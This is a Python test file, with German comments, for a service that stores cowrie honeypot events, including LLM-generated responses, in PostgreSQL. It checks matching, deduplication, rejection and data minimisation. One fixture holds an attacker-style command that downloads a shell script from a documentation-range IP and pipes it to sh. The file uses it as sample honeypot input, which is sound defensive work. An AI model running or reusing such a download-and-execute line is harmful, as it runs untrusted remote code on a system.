"""``cowrie.llm.response`` gegen eine echte Datenbank (Schritt 7.3, E-044).

Braucht PostgreSQL (Marker ``db``). Die Ereignisse sind erfunden, in der Form,
die der Patch für cowrie-b schreibt; Adressen aus dem Dokumentationsbereich.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from hashlib import sha256

import pytest
from sqlalchemy import func, select, text

from app.llm_check import counts
from app.models import Command, Event, LlmResponse, Session
from tests.conftest import send

pytestmark = pytest.mark.db

SESSION = "b0b0b0b0b0b0"
SOURCE = "203.0.113.77"
START = datetime(2026, 9, 30, 10, 0, tzinfo=timezone.utc)


def stamp(seconds: float) -> str:
    return (START + timedelta(seconds=seconds)).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def connect(sensor: str = "hp-b", session: str = SESSION) -> dict:
    return {
        "eventid": "cowrie.session.connect",
        "timestamp": stamp(0),
        "session": session,
        "sensor": sensor,
        "src_ip": SOURCE,
        "dst_ip": "198.51.100.1",
        "message": f"New connection: {SOURCE}:40000 (198.51.100.1:2322)",
    }


def command(text_: str, at: float, sensor: str = "hp-b", session: str = SESSION) -> dict:
    return {
        "eventid": "cowrie.command.input",
        "timestamp": stamp(at),
        "session": session,
        "sensor": sensor,
        "src_ip": SOURCE,
        "input": text_,
        "message": f"CMD: {text_}",
    }


def response(index: int, for_input: str, at: float, **fields) -> dict:
    event = {
        "eventid": "cowrie.llm.response",
        "timestamp": stamp(at),
        "session": SESSION,
        "sensor": "hp-b",
        "src_ip": SOURCE,
        "command_index": index,
        "outcome": "ok",
        "http_status": 200,
        "latency_ms": 1200,
        "output_chars": 40,
        "client_gone": False,
        "input_sha256": sha256(for_input.encode("utf-8")).hexdigest(),
        "message": f"LLM response ok for command {index}",
    }
    event.update(fields)
    return event


def scalar(engine, statement):
    with engine.connect() as connection:
        return connection.execute(statement).scalar()


def check(engine) -> dict:
    with engine.connect() as connection:
        return counts(connection, START - timedelta(days=1), START + timedelta(days=1))


# Ein Befehl mit URL und Adresse: gespeichert wird er entschärft, der Abgleich
# muss trotzdem passen.
FIRST = f"wget http://{SOURCE}/x.sh -O- | sh"
SECOND = ""


def a_session() -> list[dict]:
    return [
        connect(),
        command(FIRST, 1),
        command(SECOND, 2),
        # Die Antworten kommen in umgekehrter Reihenfolge, wie bei parallelen
        # Exec-Kanälen.
        response(2, SECOND, 3, outcome="local_rate_limit", http_status=None, latency_ms=None, output_chars=0),
        response(1, FIRST, 4, client_gone=True),
    ]


def test_responses_land_in_their_own_table(client, migrated):
    result = send(client, a_session()).json()
    assert result["rejected"] == 0, result

    with migrated.connect() as connection:
        rows = connection.execute(
            select(LlmResponse).order_by(LlmResponse.command_index)
        ).scalars().all()
    assert [(r.command_index, r.outcome, r.http_status, r.latency_ms, r.output_chars, r.client_gone) for r in rows] == [
        (1, "ok", 200, 1200, 40, True),
        (2, "local_rate_limit", None, None, 0, False),
    ]


def test_every_response_matches_the_command_at_its_place(client, migrated):
    send(client, a_session())
    assert check(migrated) == {
        "aufrufe": 2,
        "passt": 2,
        "passt_nicht": 0,
        "ohne_befehl": 0,
        "nicht_pruefbar": 0,
        "befehle_ohne_aufruf": 0,
        "outcomes": {"local_rate_limit": 1, "ok": 1},
    }


def test_a_shifted_numbering_is_found(client, migrated):
    """Wird ein command.input abgelehnt, rutscht alles danach eine Stelle vor."""
    broken = command(FIRST, 1)
    broken["timestamp"] = "kaputt"
    result = send(client, [connect(), broken, command(SECOND, 2), response(1, FIRST, 3), response(2, SECOND, 4)]).json()
    assert result["rejected"] == 1

    found = check(migrated)
    # Befehl 1 ist jetzt SECOND: Aufruf 1 passt nicht, Aufruf 2 hat keinen Befehl.
    assert found["passt"] == 0
    assert found["passt_nicht"] == 1
    assert found["ohne_befehl"] == 1


def test_the_plain_hash_is_stored_nowhere(client, migrated):
    send(client, a_session())
    digest = sha256(FIRST.encode("utf-8")).hexdigest()
    with migrated.connect() as connection:
        dump = []
        for table in ("events", "commands", "llm_responses"):
            rows = connection.execute(text(f"SELECT to_jsonb(t) FROM {table} AS t")).scalars().all()
            dump.extend(json.dumps(row) for row in rows)
    everything = "\n".join(dump)
    assert digest not in everything
    assert SOURCE not in everything


def test_sending_twice_adds_nothing(client, migrated):
    send(client, a_session())
    result = send(client, a_session()).json()
    assert result["accepted"] == 0
    assert scalar(migrated, select(func.count()).select_from(LlmResponse)) == 2


def test_a_second_response_to_the_same_command_is_not_stored(client, migrated):
    send(client, a_session())
    again = response(1, FIRST, 9, latency_ms=999)
    assert send(client, [again]).json()["accepted"] == 1
    assert scalar(migrated, select(func.count()).select_from(LlmResponse)) == 2
    assert scalar(migrated, select(LlmResponse.latency_ms).where(LlmResponse.command_index == 1)) == 1200


def test_commands_in_a_also_get_an_input_ref(client, migrated):
    send(client, [connect("hp-a", "a0a0a0a0a0a0"), command("uname -a", 1, "hp-a", "a0a0a0a0a0a0")])
    ref = scalar(migrated, select(Command.input_ref))
    assert ref is not None and len(ref) == 64


def test_a_response_from_a_is_refused(client, migrated):
    event = response(1, FIRST, 3)
    event["sensor"] = "hp-a"
    result = send(client, [connect("hp-a"), event]).json()
    assert result["reasons"] == {"llm.response nur in Variante b": 1}
    assert scalar(migrated, select(func.count()).select_from(LlmResponse)) == 0


def test_an_invalid_response_is_refused_and_the_rest_stays(client, migrated):
    bad = response(1, FIRST, 3, outcome="empty")
    result = send(client, [connect(), command(FIRST, 1), bad]).json()
    assert result["rejected"] == 1
    assert result["accepted"] == 2
    assert scalar(migrated, select(func.count()).select_from(Event)) == 2


def test_the_session_is_not_counted_twice_for_its_responses(client, migrated):
    """llm.response zählt nicht als Befehl."""
    send(client, a_session())
    assert scalar(migrated, select(Session.command_count)) == 2
    assert scalar(migrated, select(func.count()).select_from(Command)) == 2


def test_a_command_without_response_is_counted(client, migrated):
    send(client, [connect(), command(FIRST, 1), command("id", 2), response(1, FIRST, 3)])
    with migrated.connect() as connection:
        found = counts(connection, START - timedelta(days=1), START + timedelta(days=1))
    assert found["befehle_ohne_aufruf"] == 1
